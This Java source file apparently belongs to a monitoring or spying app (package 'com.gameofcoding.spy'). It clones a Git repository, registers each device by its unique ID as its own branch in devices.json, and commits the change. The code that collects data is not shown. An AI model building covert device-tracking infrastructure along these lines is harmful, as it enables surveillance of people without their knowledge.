package com.gameofcoding.spy.server;

import com.gameofcoding.spy.utils.XLog;
import com.gameofcoding.spy.utils.FileUtils;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import org.eclipse.jgit.api.errors.GitAPIException;
import org.eclipse.jgit.api.errors.InvalidRemoteException;
import org.eclipse.jgit.api.errors.TransportException;
import org.json.JSONArray;
import org.json.JSONException;

public class ServerManager {
    private static final String TAG = "ServerManager";
    private static final String ADDED_DEVICE_JSON_FILE_NAME = "devices.json";
    private String mDeviceGitBranchName;
    private RepoManager mGitRepo = new RepoManager();
    private File mServerRootDir;
    
    public ServerManager(File serverRootDir, String deviceUniqueId) {
	mServerRootDir = serverRootDir;
	mDeviceGitBranchName = deviceUniqueId;
    }

    private boolean downloadGitRepo()
	throws InvalidRemoteException, TransportException, GitAPIException, IOException {
	if(mServerRootDir.exists()) {
	    if(!mServerRootDir.delete())
		return false;
	}
	if(mGitRepo.clone(mServerRootDir)) {
	    if(deviceExists()) {
		XLog.i(TAG, "downloadGitRepo(): Device already exists in remote branch.");
		if(!FileUtils.deleteForcefully(mServerRootDir)) {
		    XLog.w(TAG, "downloadGitRepo(): Failed to delete existing repo dir.");
		    return false;
		}
		if(mGitRepo.clone(mServerRootDir, new String[]{mDeviceGitBranchName})) {
		    XLog.i(TAG, "downloadGitRepo(): Cloned remote repo with current devices branch..");
		    return true;
		}
	    } else {
		XLog.i(TAG, "Device not added previously, adding device...");
		mGitRepo.createBranch(mDeviceGitBranchName);
		addDevice();
		mGitRepo.commit("added device, " + mDeviceGitBranchName);
		XLog.i(TAG, "Device '" + mDeviceGitBranchName + "' added to server.");
		return true;
	    }
	}
	return false;
    }

    private boolean deviceExists() {
	File file = new File(mServerRootDir, ADDED_DEVICE_JSON_FILE_NAME);
	try {
	    if(!file.exists()) {
		XLog.w(TAG, "File that stores added device ids does not exisr, creating new one");
		if(!file.createNewFile()) {
		    XLog.w(TAG, "Failed to create file for storing device ids");
		    return false;
		}
	    }
	    FileReader fr = new FileReader(file);
	    BufferedReader br = new BufferedReader(fr);
	    String line;
	    String jsonFileData = "";
	    while((line = br.readLine()) != null)
		jsonFileData += line;
	    br.close();
	    fr.close();
	    if(jsonFileData.isEmpty())
		return false;
	    JSONArray devices = new JSONArray(jsonFileData);
	    for(int i = 0; i < devices.length(); i++) {
		String device = devices.getString(i);
		if(device.equals(mDeviceGitBranchName))
		    return true;
	    }
	} catch(IOException e) {
	    XLog.e(TAG, "Error occurred while handling file for checking device ids, file=" + file, e);
	} catch(JSONException e) {
	    XLog.e(TAG, "Error occurred while parsing json data from file, file=" + file, e);
	}
	return false;
    }
    
    private boolean addDevice() {
	File file = new File(mServerRootDir, ADDED_DEVICE_JSON_FILE_NAME);
	try {
	    if(!file.exists()) {
		XLog.w(TAG, "File that stores added device ids does not exist, creating new one");
		if(!file.createNewFile()) {
		    XLog.w(TAG, "Failed to create file for storing device ids");
		    return false;
		}
	    }
	    FileReader fr = new FileReader(file);
	    BufferedReader br = new BufferedReader(fr);
	    String line;
	    String jsonFileData = "";
	    while((line = br.readLine()) != null)
		jsonFileData += line;
	    br.close();
	    fr.close();
	    if(jsonFileData.isEmpty())
		jsonFileData = "[]";
	    JSONArray devices = new JSONArray(jsonFileData);
	    devices.put(mDeviceGitBranchName);
	    FileWriter fw = new FileWriter(file);
	    BufferedWriter bw = new BufferedWriter(fw);
	    bw.write(devices.toString());
	    bw.close();
	    fw.close();
	    return true;
	} catch(IOException e) {
	    XLog.e(TAG, "Error occurred while handling file for storing device id, file=" + file, e);
	} catch(JSONException e) {
	    XLog.e(TAG, "Error occurred while parsing json data from file, file=" + file, e);
	}
	return false;	
    }

    public Server loadServer() {
	try {
	    if(!mServerRootDir.exists()) {
		if(!downloadGitRepo())
		    return null;
	    }
	    mGitRepo.loadRepo(mServerRootDir);
	    if(mGitRepo.isLocalBranch(mDeviceGitBranchName))
		mDeviceGitBranchName = RepoManager.LOCAL_BRANCH_SUFFIX + mDeviceGitBranchName;
	    else if(mGitRepo.isRemoteBranch(mDeviceGitBranchName))
		mDeviceGitBranchName = RepoManager.REMOTE_BRANCH_SUFFIX + mDeviceGitBranchName;
	    else
		return null;	    
	    Server server = new Server(mGitRepo, mDeviceGitBranchName);
	    server.openDir(Server.Dir.MAIN)
		.saveChanges();
	    return server;
	} catch(Exception e) {
	    XLog.e(TAG, "loadServer(): Exception occured while loading repo.", e);
	    return null;
	}
    }

    public File getServerRootDir() {
	return mServerRootDir;
    }
}
